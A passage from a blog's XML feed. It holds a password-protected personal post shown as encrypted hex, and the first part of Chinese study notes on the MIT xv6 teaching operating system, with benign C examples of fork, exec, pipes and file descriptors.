25e07d05d956321db79843b3abde5c9230bc45dd097297e9e9c2b867183c7d788bccbc4caf2e02e4624a96a759caed4ef4e1f3c9641b8c660eac112ba2998d2c05ca37251fb37d45ac9d891b857b96ab52f2a45d8ad76ab7beda33ca26810a8ec2e97ea3960e9b7137bf280e412acf24103ba49d6666c4e67316ec0ea7363f9c9d51534789a3245a75282b9bada3beef6d3d1c087bfc9fe7ae1a64bd8fbd0c8f5629fd31367e9c6e6a3e32a156ddf71ca85c2182886fae7714376929675f5d25397b928e9b01da46dda6883be275e7c7f58b68266584c82dff05000cecb2678c3edb803189781813526b74bc3098cf0b4e84f52d4b5296b80f8c0566beed49875bbe88a6e943b0dc683311307d72eeea133fd25aa8d6460a60b1b3d05ef336e9007e487ec8e481c094f4328d20e8b04b9b428a7a5237952488c598aff50a7f6859cbd868ab2a60ea3062ccfa55a239a075f2187771d7db3a817def01d639cb20bf6bbb672edc9befb97b38527746b7867af081875eab96285040923ae4581860ac32be400387feea95ca2e0de39a95568bd8a6c0e55fd383c284697a4ddf151e91335e799db7f7fbd1e14e71f6794320f92fbe2a6ebd3dd96f3d00a8d4d93c284fe578d7acee3b0a7944eedd9fcfddd0f74a6957d0fa64da64b4ceb67571f23d5618241ba5bb1e202fa96a68057d7c51a2e159f456d2d1a75beff0945815cea743183f0a843da01f6e788c66780c1e6aa1766d4d351ccb1abef078e50857a089cc607d6646e677ac2336c90c49608e7948546a551b8d5ce31db51ee33945d2eeaf5005b5b0f5936db60e01463dddd5518590bdabcea8640aebd87624f14cb1e5fdf79a6b7591457d54e3148729c4321076351e6e4a05fe4bd049421562b882c48d50e317e461643e265cd58076578ca7bd4ee78d5449b3c926f13292317fefa8cf99b7432212c0413e29144e4a7f80c5cf43e5a605c117941768b3b0b56f2ee488e6a03e444157e09942e4bdff7e123fd70490a49e8df93d621e6ff2ecec4c5c4c626e37cae1e80078e33c83739f0c6a39ab72ea344c73fc3f4f886e8143b2923205ced8d6069cac79ca68f875a78639bfe9d50e855e2c7c7e8af08a33ac5d1bd2c25a806b8189f4be1c91ee2df570ec3d4a4a921b18a6b074e79e7e551cc4b90d4274c2084167e108b58b24d38ee17c665d6fc9dce8dc3b7a63cb2e5b604b3716cd4b26ed0fe3f6acbea5ffce1600b9eccfa4509e019615659ecad0448ac0aa82d041e6ab3890f5c9678b0dd2cdb152014fc18d749c94baf3ee2de81050d55c1c5b5b0861c008ad1f5e929a4aa8deaa3e4619a0de9d5db81dc6a99c7add527f67e17c00ce923f37d528157dd5dbf5a99932009b34e449394ef8b1c101d482a80302cecd455f1814e79b34b142b814610ade1c8ffb51e2fb97e071cbe3e85c569bd818f297661acfb5941857e6b5a5fa75eae99a13fd6a2c6391da90b646dae715b44343cadc6dd4f388f6c6af2857712b5bf38be2a7cf42a604b19b5bab5807674f073891309e4d20630c0f0a8eaaa4059834298852bf70e0fb7702189dfb4248fbfc23b5ea8d4a3fa8438ad2ba97532b22997d891631fd61cb4170ca5b91757d5d4a7847764410648add66a131411e19c165900a5dcc9f457adf7543906a8d026b58e7bc80592cca892e04236d2001387da92bba1b1d35a58fae16f93545313f9be060ec1c316c62a62019aa5830cb6ef72e3be243562d0e571073699952283c0f11b77678b1ac55f65a6453b98c5516f50d168f067cbc718b3a5f5de42eee94ce902263b96dce62289500795e1fdb273d8b4112f7274016673ae4aa550238c2a34929ace07d73794a64a1ff07e4bc0e8d59a0d4b2166839f1db58db4225053579b59255340af3fef9e2c5738f012e5d1c829fc13455215d3d474042cf6f66c7b41143f9509bc37e812549ff50319051ec6a4c7e579cc315ae62b6f119135469fb1c176e52f060b69417b23a0cc2e290e39049147a50dac5c1f55b08f0196a9a4e5d4d23851e81fe3407d060eabf643081f798bd284561d739a90f57bcb79e914cf6de4499eeace803c58ebbcd009743a97e4df065bc4ce82e0d708ca79d7ec9bf49ca83b5aea2c5179fcfdb62a01a81c04a098400a9c105d738e2db720e6529879ed9833d146ff5f53164b5a56b3d8b3c9fbb7f85a68f9ddad8874294cc2937a82dddb2e41831815708ca408fbd4b922a03b642649b7c919b2ae4332474e6207286c22434c3ecdb83b282cf545a3046a0c85df6d00c2a64dc83d4e02564c670c363dfed6b03e909f7b7a463e0d5beb157ff02a6ca9a0eba31c123bf7d822ac1a5547b0ade26b5c6ea28947a1e7513e5c825303a70b80d1cd3687b0fb716d1d67242935d76ec98e8b7479f1ae326dc910418bb0fd827cf8a0b6082be78979345b3280534884cb57fb43add26f2fc6aafd4cc4bd452ca3f24bbae841a4de67a63185709563ef8520694339cdc23f60e1d04c73f61aa5ca5b870295fd6f6d1f092274a1fa9cd4efd785899fe681ae8b2a1e26f35e61bea79998a4c6170ebc4618fc326be06cf06ffd7ee0f4817d6b08e5be29245695d247d1cc2d757b26aa91e19108f4b9119ee80a636479dc795f7b40193f78c3fa7dd134a18f7c89895070e55e72d600a92b60ed45bb54ee5a1910bae0947ab83717d0d08767bc4fffae21d09c4541befd8be381354afbba29afcd99d153bb6216d00a378d18c47cffb8464ba6b01aa2e9c7dbb8a316a8d8027705985d1a996bf8cf138968393b4de05d963b2cdba11b8b94c127aacc7dc9830822b9ad957f3e5ee09717042b36bcc656314ecc75f5d1e080d67a5a580b465cedb69cfce1487f1f1d3b3c3ab64975e0369f9a53fee9afc66885bf098560d55e80cbdb112f34e51b2be05d0a95ccfb1c63734e9818846c97e97795ca4362e8db0e20983675205f066bca4ca8075371faddf41802faf3ff001f95b1442ed19e3baedc47fc59b355144d719010571f85aab584d14b1bcd6ad071897a61888b623ba0109eb7f64db40f0affca33ac8737ac4aeeb2dbeef1f8db87fc0995d0e7e90d7b76974dc02fefc07ddb9900f6ee7767af111da2fd20d447c08b2382dc01380c35a3b8c4de2ba022afd50e4d9b32f7e26d991c7acb7bf9156e92cd789e4f276a1a3a2d4164369c43836b0f4bd051cf11e6f2b6acbd13109871f2381448b7e655bf57a30c0f10e66ba12efc654815f6fc8abc40fe673f2fedc83de42c12c8a54075def2647d6c4e133b3f68ec7777c573e0d4a2774516c147932973c78973b4692057db4dd9a69eaa0ef0f75fde46db317ad8939c406f2b7d9084b1e71413c6c94e989dd77c016a288a0056d6854a12ed625025653ce2d170c93e665cb9f5afd6d43a86301a92d4e6bb1cb0088781877cb267b1d1dbe8fae6038a01131db87accb9ca316b1b9bcedd4c97680cdf5b021f3e2c1c28522f57de88053bfb88b4609488141ce5573fe37f4b787ec097ae1f0348e3359de65f6df4905aa61f9a4caf4130a2cbbecdba23c95f8d7513667e0e6247cbde07fec951eae6dd30876d08da09bf7b6edadf8d009e7e9a769936e55a888dd49a50b8237975ebaee7b0bbfeccc1171d4e476012700cf6a104cbf9af5c16b7abde6c35575c4aaad3c9c93d65cb2f294c17885a83bd92e091110cc14f2ae4dcdde379159252f48f1d9a50682e3d12094d371cebeaed1ee7f5ec47d9a18d10603319c2a7fde89d04d484a728c704cfeb290b4cbd5c5d0f04def9846bedd52f99066e18bebec79755e22ade103cf0b7e7e7e93e781d8b130e9e99e16000b511448a48b22a310451f63a196ac5cbddfcef859d59c294383a11715b9761fbaacaca1fc9aa4ffc8a5a64027dc52035d5e54f9b4ab668edaf391c993771ca6b00de3866eabe6ae2d83171472ea55243df668ce0d3add19ff783bbec5383f1771370c5ca3c3c9a3f3a64f99fe0277aea7abf6cc7a3c0d93ab990005f822d323ade2193972a47978627ca436b382b827e07385ed69530f2dfa1ee3993fd83216cff0eb74aaade4a0a2a21b483bf577b790861acf67f47745a35acc20495116e4b44e33f3b3f91728c4d28c6aa29fede6ecbff4c28494f00cdf611ac990df4980c0a3a21a1230dabd14bc1d8afbff9b4ef37196524eafcbd07de481652b5169541ec4b5572a200de4fe58ae1e9901a3c9dccf33738b88eeac0523f00b563408e464ae6c9682fa19406e4ee773c76009826edeebeaedc62e4e6e042b8c91155b81bde51d9b0e508fade4b169e6c56eba19b119123c34416c93d9129839d6e773db0787a45b54b927a20e94b76489b378b9074781a00a9788c1284f09e773fb456ca8d33f56cf01a3784b6107452c9144c1e7fae5bb8abbf3ecbf498db43659c0e6d3af775902ec8505b7770e00832be5a59aef9d331b9bb8dfdfd4b9d36e12ce7e69c5e8353ba7a8bc7b20f1ae2fc0f893988cd94de490bf35882f5b6bc4cab56bdb29e32492280f9fa5d053cd5b7f8ef6285d324ca8ad9d604a5066928a73fdb91e86575412af6760d204d098fae49d76647848c0ebaa758d9b620c99d86d4d556e5fd306acdfd8d1247edd09cde0edfae39f0ab960948754cb5b770f0fd86211255795d788b5ad773acd30770aed2417971fea2325a987d359299f993de7761ac6b4eb7e2504974bd4be0f81aee1a24b647fc4bb1944eb0f122ec7448f977115e6cd09dcb727ad4c71d3969138c4cd11b2cbe1d51c7d3928bf0f691886d09987e92b2b64af76becec2dc526a41bef70147badfd8993dfbd9e508de9c9dfdf5c5628c0d8626ddf5f9840daac3c28abe100f198ef0278a1bf90c75dd5054b59cb5f36db787f11d965e896ae30afca8d649c269c3b17af1a025bc37981b51fc89d054567a7db4b81c45f2a783622a72195aa947ac62f1ed591d639ac4e933adff456a17ae2550b174015743f2ee58914a320202271dc3524f3cd18eb5922243388336d28dd4bf852e5dd9d63c503b76eec18b325046acf53c04d658ae53926f3cf0f6c052eccfd6babafcd277b306ef5b972a048cfb372545cf79d7b4df43ee652b805d71f93eae9db8905f11065e9b44acdb749773e9759e6743653bccda0f5598192a09d1cfbc4355e0d74a0aa33080997ebec93277195ec847e76a5668ebd47ce2740e322c032143d88c63c0e0d904120dc1423203c3db5076e6f68d9f7eaab5268b29d2a72f6262475aec5eab54fd7dac9f8e99d3e8b355111ad87d617010150a6176df</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    <category term="Life" scheme="https://ghostasky.github.io/categories/Life/"/>
    
    
    <category term="Life" scheme="https://ghostasky.github.io/tags/Life/"/>
    
  </entry>
  
  <entry>
    <title>XV6阅读笔记</title>
    <link href="https://ghostasky.github.io/2022/07/12/XV6/"/>
    <id>https://ghostasky.github.io/2022/07/12/XV6/</id>
    <published>2022-07-11T16:00:00.000Z</published>
    <updated>2022-07-21T06:09:43.872Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><blockquote><p>英文版：https://pdos.csail.mit.edu/6.828/2020/xv6/book-riscv-rev1.pdf</p><p>中文版：http://xv6.dgs.zone/</p></blockquote><h1 id="chapter-1operating-system-interfaces">Chapter 1:Operating system interfaces</h1><blockquote><p>xv6 是 MIT 开发的一个教学用的完整的类 Unix 操作系统，并且在 MIT 的操作系统课程 <a href="http://pdos.csail.mit.edu/6.828/2012/xv6.html">6.828</a> 中使用</p><p>xv6 是 Dennis Ritchie 和 Ken Thompson 合著的 Unix Version 6（v6）操作系统的重新实现。xv6 在一定程度上遵守 v6 的结构和风格，但它是用 ANSI C 实现的，并且是基于 x86 多核处理器的。</p></blockquote><p>进程通过<strong>系统调用</strong>使用内核服务。系统调用会进入内核，让内核执行服务然后返回。所以进程总是在用户空间和内核空间之间交替运行。</p><p>内核使用了CPU 的硬件保护机制来保证用户进程只能访问自己的内存空间。内核拥有实现保护机制所需的硬件权限(hardware privileges)，而用户程序没有这些权限。当一个用户程序进行一次系统调用时，硬件会提升特权级并且开始执行一些内核中预定义的功能。</p><p>xv6中提供的系统调用(部分unix)：</p><table><thead><tr class="header"><th>系统调用</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>fork()</td><td>创建进程</td></tr><tr class="even"><td>exit()</td><td>结束当前进程</td></tr><tr class="odd"><td>wait()</td><td>等待子进程结束</td></tr><tr class="even"><td>kill(pid)</td><td>结束 pid 所指进程</td></tr><tr class="odd"><td>getpid()</td><td>获得当前进程 pid</td></tr><tr class="even"><td>sleep(n)</td><td>睡眠 n 秒</td></tr><tr class="odd"><td>exec(filename, *argv)</td><td>加载并执行一个文件</td></tr><tr class="even"><td>sbrk(n)</td><td>为进程内存空间增加 n 字节</td></tr><tr class="odd"><td>open(filename, flags)</td><td>打开文件，flags 指定读/写模式</td></tr><tr class="even"><td>read(fd, buf, n)</td><td>从文件中读 n 个字节到 buf</td></tr><tr class="odd"><td>write(fd, buf, n)</td><td>从 buf 中写 n 个字节到文件</td></tr><tr class="even"><td>close(fd)</td><td>关闭打开的 fd</td></tr><tr class="odd"><td>dup(fd)</td><td>复制 fd</td></tr><tr class="even"><td>pipe( p)</td><td>创建管道， 并把读和写的 fd 返回到p</td></tr><tr class="odd"><td>chdir(dirname)</td><td>改变当前目录</td></tr><tr class="even"><td>mkdir(dirname)</td><td>创建新的目录</td></tr><tr class="odd"><td>mknod(name, major, minor)</td><td>创建设备文件</td></tr><tr class="even"><td>fstat(fd)</td><td>返回文件信息</td></tr><tr class="odd"><td>link(f1, f2)</td><td>给 f1 创建一个新名字(f2)</td></tr><tr class="even"><td>unlink(filename)</td><td>删除文件</td></tr></tbody></table><p>xv6 shell的具体实现在<code>user/sh.c</code></p><h2 id="进程和内存">1.1 进程和内存</h2><p><code>fork</code> 函数在父进程、子进程中都返回（一次调用两次返回），对于父进程它返回子进程的 pid，对于子进程它返回 0。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> pid;</span><br><span class="line">pid = fork();</span><br><span class="line"><span class="keyword">if</span>(pid &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;parent: child=%d\n&quot;</span>, pid);</span><br><span class="line">    pid = wait();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child %d is done\n&quot;</span>, pid);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;child: exiting\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fork error\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>系统调用 <code>wait</code> 会返回一个<strong>当前进程已退出的子进程</strong>，如果没有子进程退出，<code>wait</code> 会等候直到有一个子进程退出。</p><p>父子进程拥有不同的内存空间和寄存器，改变一个进程中的变量不会影响另一个进程，这一点在代码中有体现。</p><p><code>exec</code>系统调用，从某个<em>文件</em>（通常是可执行文件）里读取内存镜像，并将其替换到调用它的进程的内存空间，这样的话，在执行<code>exec</code>系统调用后不返回，而是直接执行调用的elf文件：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *argv[<span class="number">3</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;echo&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">argv[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">exec(<span class="string">&quot;/bin/echo&quot;</span>, argv);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;exec error\n&quot;</span>);<span class="comment">//注意这里，不返回，走这一步说明出问题了</span></span><br></pre></td></tr></table></figure><p>下面是xv6 shell的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="comment">// Ensure that three file descriptors are open.</span></span><br><span class="line"><span class="keyword">while</span> ((fd = open(<span class="string">&quot;console&quot;</span>, O_RDWR)) &gt;= <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (fd &gt;= <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Read and run input commands.</span></span><br><span class="line"><span class="keyword">while</span> (getcmd(buf, <span class="keyword">sizeof</span>(buf)) &gt;= <span class="number">0</span>)<span class="comment">//getcmd 读取命令行的输入</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;c&#x27;</span> &amp;&amp; buf[<span class="number">1</span>] == <span class="string">&#x27;d&#x27;</span> &amp;&amp; buf[<span class="number">2</span>] == <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Chdir must be called by the parent, not the child.</span></span><br><span class="line">buf[<span class="built_in">strlen</span>(buf) - <span class="number">1</span>] = <span class="number">0</span>; <span class="comment">// chop \n</span></span><br><span class="line"><span class="keyword">if</span> (chdir(buf + <span class="number">3</span>) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="number">2</span>, <span class="string">&quot;cannot cd %s\n&quot;</span>, buf + <span class="number">3</span>);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (fork1() == <span class="number">0</span>)<span class="comment">//调用fork</span></span><br><span class="line">runcmd(parsecmd(buf));</span><br><span class="line">wait(<span class="number">0</span>);<span class="comment">//父进程等待子进程退出</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>fork</code>的时候要拷贝elf的内容，空间不够的话：<code>sbrk(n)</code> 来增加 n 字节的数据内存。<code>sbrk</code> 返回新的内存的地址。</p><h2 id="io-和文件描述符">1.2 I/O 和文件描述符</h2><p><strong>文件描述符</strong>是一个整数，它代表了一个进程可以读写的被内核管理的对象。进程可以通过多种方式获得一个文件描述符，如打开文件、目录、设备，或者创建一个管道（pipe），或者复制已经存在的文件描述符。</p><p>每个进程都有一张表，而 xv6 内核就以文件描述符作为这张表的索引，所以每个进程都有一个从0开始的文件描述符空间。见下图，但是这里不深究，也就看个大概，真想深究的话，去跟iofile的源码。</p><p>文件描述符0读入（标准输入），从文件描述符1输出（标准输出），从文件描述符2输出错误（标准错误输出）。</p><p><img src="/2022/07/12/XV6/image-20220707211016555.png"></p><p>系统调用 <code>close</code> 会释放一个文件描述符，使得它之后可以被 <code>open</code>, <code>pipe</code>, <code>dup</code> 等调用重用。新分配的文件描述符始终是当前进程中编号最少的未使用描述符。</p><p><code>fork</code> 会复制父进程的文件描述符和内存，所以子进程和父进程的文件描述符一模一样。</p><p><code>exec</code> 会替换调用它的进程的内存但是会保留它的文件描述符表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* argv[<span class="number">2</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    open(<span class="string">&quot;input.txt&quot;</span>, O_RDONLY);</span><br><span class="line">    exec(<span class="string">&quot;cat&quot;</span>, argv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在子进程关闭文件描述符0之后，<code>open</code>使用新打开的input.txt(0文件描述符为0)。<code>cat</code>然后执行文件描述符0(标准输入)，但引用的是input.txt。父进程的文件描述符不会被这个序列改变，因为它只修改子进程的描述符。(这里还是挺有意思的)</p><p><code>open</code>的第二个参数由一组标志组成，这些标志以位表示，用于控制打开的操作。在<code>kernel/fcntl.h</code>中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDONLY  0x000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_WRONLY  0x001</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_RDWR    0x002</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_CREATE  0x200<span class="comment">//如果文件不存在则创建文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> O_TRUNC   0x400<span class="comment">//将文件截断为零长度</span></span></span><br></pre></td></tr></table></figure><p><code>dup</code>系统调用复制一个现有的文件描述符，返回一个引用自同一个底层I/O对象的新文件描述符。</p><p>helloword的另一种写法：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd = dup(<span class="number">1</span>);</span><br><span class="line">write(<span class="number">1</span>, <span class="string">&quot;hello&quot;</span>, <span class="number">6</span>);</span><br><span class="line">write(fd, <span class="string">&quot;world\n&quot;</span>, <span class="number">6</span>);</span><br></pre></td></tr></table></figure><h2 id="管道">1.3 管道</h2><p>管道是一个小的内核缓冲区，它以文件描述符对的形式提供给进程，一个用于写操作，一个用于读操作。从管道的一端写的数据可以从管道的另一端读取。提供了一种<strong>进程间</strong>交互的方式。就是队列，0是读，1是写。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> p[<span class="number">2</span>];</span><br><span class="line"><span class="keyword">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">&quot;wc&quot;</span>;</span><br><span class="line">argv[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">pipe(p);</span><br><span class="line"><span class="keyword">if</span>(fork() == <span class="number">0</span>) &#123;</span><br><span class="line">    close(<span class="number">0</span>);</span><br><span class="line">    dup(p[<span class="number">0</span>]);<span class="comment">//调用close和dup使文件描述符0指向管道的读取端</span></span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">    exec(<span class="string">&quot;/bin/wc&quot;</span>, argv);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    write(p[<span class="number">1</span>], <span class="string">&quot;hello world\n&quot;</span>, <span class="number">12</span>);</span><br><span class="line">    close(p[<span class="number">0</span>]);</span><br><span class="line">    close(p[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>link</code>系统调用创建另一个文件名，该文件名指向与现有文件相同的inode。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">&quot;a&quot;</span>, O_CREATE | O_WRONLY);</span><br><span class="line">link(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>);</span><br><span class="line"><span class="comment">// 创建了一个既叫做 a 又叫做 b 的新文件</span></span><br><span class="line">unlink(<span class="string">&quot;a&quot;</span>)，</span><br></pre></td></tr></table></figure><p>读写 <code>a</code> 就相当于读写 <code>b</code>。每一个 inode 都由一个唯一的 <code>inode 号</code> 直接确定。在上面这段代码中，我们可以通过 <code>fstat</code> 知道 <code>a</code> 和 <code>b</code> 都指向同样的内容：<code>a</code> 和 <code>b</code> 都会返回同样的 inode 号（<code>ino</code>），并且 <code>nlink</code> 数会设置为2。</p><p>系统调用 <code>unlink</code> 从文件系统移除一个文件名。一个文件的 inode 和磁盘空间只有当它的链接数变为 0 的时候才会被清空，也就是没有一个文件再指向它。</p><h2 id="文件系统">1.4 文件系统</h2><p>xv6 文件系统提供文件和目录，文件就是一个简单的字节数组，而目录包含指向文件和其他目录的引用。</p><p>不从 <code>/</code> 开始的目录表示的是相对调用进程当前目录的目录，调用进程的当前目录可以通过 <code>chdir</code> 这个系统调用进行改变。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">&quot;/a&quot;</span>);</span><br><span class="line">chdir(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">open(<span class="string">&quot;c&quot;</span>, O_RDONLY);</span><br><span class="line">open(<span class="string">&quot;/a/b/c&quot;</span>, O_RDONLY);</span><br></pre></td></tr></table></figure><p><code>mknod</code>创建一个引用设备的特殊文件。与设备文件相关联的是主设备号和次设备号(<code>mknod</code>的两个参数)，它们唯一地标识了一个内核设备。当进程稍后打开设备文件时，内核将使用内核设备实现<code>read</code>和<code>write</code>系统调用，而不是使用文件系统。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir(<span class="string">&quot;/dir&quot;</span>);</span><br><span class="line">fd = open(<span class="string">&quot;/dir/file&quot;</span>, O_CREATE | O_WRONLY);</span><br><span class="line">close(fd);</span><br><span class="line">mknod(<span class="string">&quot;/console&quot;</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>同一个底层文件（叫做inode，索引结点）可以有多个名字（叫做link，链接）。每个链接都由目录中的一个条目组成;该条目包含一个文件名和一个inode引用。Inode保存有关文件的元数据（用于解释或帮助理解信息的数据），包括其类型(文件/目录/设备)、长度、文件内容在磁盘上的位置以及指向文件的链接数。</p><p><code>fstat</code> 可以获取一个文件描述符指向的文件的信息。它填充一个名为 <code>stat</code> 的结构体，它在 <code>stat.h</code> 中定义为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_DIR     1   <span class="comment">// Directory</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_FILE    2   <span class="comment">// File</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> T_DEVICE  3   <span class="comment">// Device</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stat</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> dev;     <span class="comment">// File system&#x27;s disk device</span></span><br><span class="line">  uint ino;    <span class="comment">// Inode number,Inode编号</span></span><br><span class="line">  <span class="keyword">short</span> type;  <span class="comment">// Type of file</span></span><br><span class="line">  <span class="keyword">short</span> nlink; <span class="comment">// Number of links to file，指向文件的链接数</span></span><br><span class="line">  uint64 size; <span class="comment">// Size of file in bytes</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="chapter-2operating-system-organization">Chapter 2:Operating system organization</h1><h2 id="xv6架构">2.1 xv6架构</h2><table><thead><tr class="header"><th><strong>文件</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr class="odd"><td><strong>bio.c</strong></td><td>文件系统的磁盘块缓存</td></tr><tr class="even"><td><strong>def.h</strong></td><td>模块间的接口定义</td></tr><tr class="odd"><td><strong>console.c</strong></td><td>连接到用户的键盘和屏幕</td></tr><tr 